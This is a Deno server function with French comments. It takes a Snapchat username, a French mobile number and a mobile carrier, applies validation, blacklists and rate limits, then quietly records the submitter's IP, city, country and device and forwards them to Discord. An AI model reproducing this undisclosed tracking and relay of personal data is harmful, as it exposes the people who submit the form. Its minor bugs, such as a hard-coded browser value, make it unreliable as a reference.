import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const VALID_OPERATORS = ['SFR', 'Bouygues', 'Orange'];
const MAX_SUBMISSIONS_PER_IP = 3;        // max 3 soumissions par IP dans la fenêtre
const WINDOW_HOURS = 24;                  // fenêtre de 24h
const BLOCK_DURATION_MINUTES = 5;         // 5 min minimum entre 2 soumissions même IP

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const { snapchat, telephone, operateur } = await req.json();

    // ---- Validation stricte côté serveur ----
    if (!snapchat || !telephone || !operateur) {
      return Response.json({ error: 'Données manquantes' }, { status: 400 });
    }

    // Opérateur doit être valide
    if (!VALID_OPERATORS.includes(operateur)) {
      return Response.json({ error: 'Opérateur invalide' }, { status: 400 });
    }

    // Téléphone : uniquement 06/07 + 10 chiffres
    const tel = String(telephone).replace(/\D/g, '');
    if (!/^(06|07)\d{8}$/.test(tel)) {
      return Response.json({ error: 'Numéro de téléphone invalide' }, { status: 400 });
    }

    // Snapchat : nettoyage + limites
    const snap = String(snapchat).trim();
    if (snap.length < 1 || snap.length > 30) {
      return Response.json({ error: 'Nom Snapchat invalide' }, { status: 400 });
    }
    // Filtrer les caractères non autorisés (lettres, chiffres, _ . - uniquement)
    if (!/^[a-zA-Z0-9_.-]+$/.test(snap)) {
      return Response.json({ error: 'Nom Snapchat invalide' }, { status: 400 });
    }

    // ---- Extraction IP ----
    let ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
             req.headers.get('x-real-ip') ||
             req.headers.get('cf-connecting-ip') ||
             req.headers.get('x-client-ip') ||
             'unknown';
    ip = ip.trim();

    // ---- Extraction navigateur / appareil ----
    const userAgent = req.headers.get('user-agent') || '';
    let browser = 'Inconnu';
    let device = '💻 PC';
    if (userAgent.includes('Chrome')) browser = 'Chrome';
    else if (userAgent.includes('Safari')) browser = 'Safari';
    else if (userAgent.includes('Firefox')) browser = 'Firefox';
    else if (userAgent.includes('Edge')) browser = 'Edge';
    if (userAgent.includes('Mobile') || userAgent.includes('Android')) device = '📱 Téléphone';
    else if (userAgent.includes('iPad')) device = '📱 Tablette';

    // ---- Vérification blacklist IP + téléphone ----
    if (ip !== 'unknown') {
      const ipBlacklisted = await base44.asServiceRole.entities.BlacklistEntry.filter({ value: ip, type: 'ip' });
      if (ipBlacklisted.length > 0) {
        return Response.json({ error: 'Accès refusé' }, { status: 403 });
      }
    }
    const phoneBlacklisted = await base44.asServiceRole.entities.BlacklistEntry.filter({ value: tel, type: 'phone' });
    if (phoneBlacklisted.length > 0) {
      return Response.json({ error: 'Accès refusé' }, { status: 403 });
    }

    // ---- Rate limiting par IP (max 3 soumissions / 24h, 5 min minimum entre 2) ----
    const now = new Date();
    const recentFromIp = await base44.asServiceRole.entities.Submission.list('-created_date', 50);
    const ipSubmissions = recentFromIp.filter(s => s.ip_address === ip);
    const recentPhoneSubs = recentFromIp.filter(s => String(s.telephone || '').replace(/\D/g, '') === tel);

    // Limite par 24h
    const windowStart = new Date(now.getTime() - WINDOW_HOURS * 60 * 60 * 1000);
    const ipInWindow = ipSubmissions.filter(s => new Date(s.created_date) > windowStart);
    if (ipInWindow.length >= MAX_SUBMISSIONS_PER_IP) {
      return Response.json({ error: 'Limite de soumissions atteinte pour cette adresse IP. Réessayez plus tard.' }, { status: 429 });
    }

    // 5 min minimum entre 2 soumissions
    if (ipSubmissions.length > 0) {
      const lastSub = new Date(ipSubmissions[0].created_date);
      const minsSinceLast = (now - lastSub) / 1000 / 60;
      if (minsSinceLast < BLOCK_DURATION_MINUTES) {
        const wait = Math.ceil(BLOCK_DURATION_MINUTES - minsSinceLast);
        return Response.json({ error: `Attends ${wait} minute(s) avant une nouvelle demande` }, { status: 429 });
      }
    }

    // Limite par numéro de téléphone (max 2 par 24h)
    if (recentPhoneSubs.length >= 2) {
      return Response.json({ error: 'Limite de demandes atteinte pour ce numéro' }, { status: 429 });
    }

    // ---- Géolocalisation ----
    let country = 'Inconnue';
    let city = 'Inconnue';
    try {
      const geoRes = await base44.functions.invoke('geolocateIP', { ip });
      if (geoRes?.data) {
        country = geoRes.data.country || 'Inconnue';
        city = geoRes.data.city || 'Inconnue';
      }
    } catch (geoError) {
      console.error('geolocateIP error:', geoError.message);
    }

    // ---- Création de la soumission ----
    const submission = await base44.asServiceRole.entities.Submission.create({
      snapchat: snap,
      telephone: tel,
      operateur,
      status: 'pending',
      ip_address: ip,
      country,
      browser: 'unknown'
    });

    // ---- Notification Discord ----
    await base44.functions.invoke('notifyDiscord', {
      snapchat: snap,
      telephone: tel,
      operateur,
      submissionId: submission.id,
      ip,
      country,
      city,
      browser,
      device
    }).catch(() => {});

    return Response.json({ ok: true, submissionId: submission.id });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});